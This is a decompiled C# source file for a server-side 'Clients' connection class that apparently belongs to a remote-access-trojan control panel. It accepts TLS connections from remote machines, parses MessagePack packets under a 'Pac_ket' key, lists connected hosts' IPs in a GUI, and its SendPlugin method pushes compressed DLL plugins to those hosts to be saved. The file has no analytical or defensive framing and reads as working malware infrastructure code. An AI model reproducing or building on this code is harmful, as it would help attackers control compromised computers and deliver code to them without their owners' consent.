using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server.Connection;

public class Clients
{
	public Socket TcpClient { get; set; }

	public SslStream SslClient { get; set; }

	public ListViewItem LV { get; set; }

	public ListViewItem LV2 { get; set; }

	public string ID { get; set; }

	private byte[] ClientBuffer { get; set; }

	private long HeaderSize { get; set; }

	private long Offset { get; set; }

	private bool ClientBufferRecevied { get; set; }

	public object SendSync { get; set; }

	public long BytesRecevied { get; set; }

	public string Ip { get; set; }

	public bool Admin { get; set; }

	public DateTime LastPing { get; set; }

	public Clients(Socket socket)
	{
		SendSync = new object();
		TcpClient = socket;
		Ip = TcpClient.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0];
		SslClient = new SslStream(new NetworkStream(TcpClient, ownsSocket: true), leaveInnerStreamOpen: false);
		SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, clientCertificateRequired: false, SslProtocols.Tls, checkCertificateRevocation: false, EndAuthenticate, null);
	}

	private void EndAuthenticate(IAsyncResult ar)
	{
		try
		{
			SslClient.EndAuthenticateAsServer(ar);
			Offset = 0L;
			HeaderSize = 4L;
			ClientBuffer = new byte[HeaderSize];
			SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
		}
		catch
		{
			SslClient?.Dispose();
			TcpClient?.Dispose();
		}
	}

	public void ReadClientData(IAsyncResult ar)
	{
		try
		{
			if (!TcpClient.Connected)
			{
				Disconnected();
				return;
			}
			int num = SslClient.EndRead(ar);
			if (num > 0)
			{
				HeaderSize -= num;
				Offset += num;
				if (!ClientBufferRecevied)
				{
					if (HeaderSize == 0L)
					{
						HeaderSize = BitConverter.ToInt32(ClientBuffer, 0);
						if (HeaderSize > 0L)
						{
							ClientBuffer = new byte[HeaderSize];
							Offset = 0L;
							ClientBufferRecevied = true;
						}
					}
					else if (HeaderSize < 0L)
					{
						Disconnected();
						return;
					}
				}
				else
				{
					lock (Settings.LockReceivedSendValue)
					{
						Settings.ReceivedValue += num;
					}
					BytesRecevied += num;
					if (HeaderSize == 0L)
					{
						ThreadPool.QueueUserWorkItem(new Packet
						{
							client = this,
							data = ClientBuffer
						}.Read, null);
						Offset = 0L;
						HeaderSize = 4L;
						ClientBuffer = new byte[HeaderSize];
						ClientBufferRecevied = false;
					}
					else if (HeaderSize < 0L)
					{
						Disconnected();
						return;
					}
				}
				SslClient.BeginRead(ClientBuffer, (int)Offset, (int)HeaderSize, ReadClientData, null);
			}
			else
			{
				Disconnected();
			}
		}
		catch
		{
			Disconnected();
		}
	}

	public void Disconnected()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		if (LV != null)
		{
			((Control)Program.form1).Invoke((Delegate)(MethodInvoker)delegate
			{
				//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
				//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
				try
				{
					lock (Settings.LockListviewClients)
					{
						LV.Remove();
					}
					if (LV2 != null)
					{
						lock (Settings.LockListviewThumb)
						{
							LV2.Remove();
						}
					}
				}
				catch
				{
				}
				new HandleLogs().Addmsg("Client " + Ip + " disconnected.", Color.Red);
				if (TimeZoneInfo.Local.Id == "China Standard Time" && Server.Properties.Settings.Default.Notification)
				{
					SoundPlayer val = new SoundPlayer((Stream)Resources.offline);
					val.Load();
					val.Play();
				}
				foreach (AsyncTask item in Form1.getTasks.ToList())
				{
					item.doneClient.Remove(ID);
				}
			});
		}
		try
		{
			SslClient?.Dispose();
			TcpClient?.Dispose();
		}
		catch
		{
		}
	}

	public bool GetListview(string id)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		foreach (ListViewItem item in Program.form1.listView4.get_Items())
		{
			if (item.get_ToolTipText() == id)
			{
				return true;
			}
		}
		return false;
	}

	public void Send(object msg)
	{
		lock (SendSync)
		{
			try
			{
				if (!TcpClient.Connected)
				{
					Disconnected();
				}
				else
				{
					if ((byte[])msg == null)
					{
						return;
					}
					byte[] array = (byte[])msg;
					byte[] bytes = BitConverter.GetBytes(array.Length);
					TcpClient.Poll(-1, SelectMode.SelectWrite);
					SslClient.Write(bytes, 0, bytes.Length);
					if (array.Length > 1000000)
					{
						using (MemoryStream memoryStream = new MemoryStream(array))
						{
							int num = 0;
							memoryStream.Position = 0L;
							byte[] array2 = new byte[50000];
							while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
							{
								TcpClient.Poll(-1, SelectMode.SelectWrite);
								SslClient.Write(array2, 0, num);
								lock (Settings.LockReceivedSendValue)
								{
									Settings.SentValue += num;
								}
							}
							return;
						}
					}
					TcpClient.Poll(-1, SelectMode.SelectWrite);
					SslClient.Write(array, 0, array.Length);
					SslClient.Flush();
					lock (Settings.LockReceivedSendValue)
					{
						Settings.SentValue += array.Length;
						return;
					}
				}
			}
			catch
			{
				Disconnected();
			}
		}
	}

	public void SendPlugin(string hash)
	{
		try
		{
			string[] files = Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly);
			int num = 0;
			string text;
			while (true)
			{
				if (num < files.Length)
				{
					text = files[num];
					if (hash == GetHash.GetChecksum(text))
					{
						break;
					}
					num++;
					continue;
				}
				return;
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
			msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
			msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
			ThreadPool.QueueUserWorkItem(Send, msgPack.Encode2Bytes());
			new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " Sent to " + Ip, Color.Blue);
		}
		catch (Exception ex)
		{
			new HandleLogs().Addmsg("Clinet " + Ip + " " + ex.Message, Color.Red);
		}
	}
}
